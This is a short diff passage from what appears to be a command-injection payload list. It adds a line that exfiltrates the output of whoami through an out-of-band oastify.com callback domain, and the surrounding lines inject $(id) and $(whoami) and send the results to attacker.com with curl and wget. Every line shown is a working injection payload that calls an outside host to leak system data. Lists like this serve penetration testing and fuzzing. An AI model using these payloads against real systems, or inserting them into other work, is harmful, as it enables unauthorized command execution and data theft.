@@ -187,6 +187,7 @@ $(whoami)
 `whoami` > /tmp/output.txt
 $(id) > /tmp/output.txt
 $(whoami) > /tmp/output.txt
+; curl `whoami`.omesahu9nof8ql22r8i9a1cvum0do6cv.oastify.com
 ; curl http://attacker.com?data=$(id)
 ; wget http://attacker.com?data=$(id)
 | curl http://attacker.com?data=$(id)
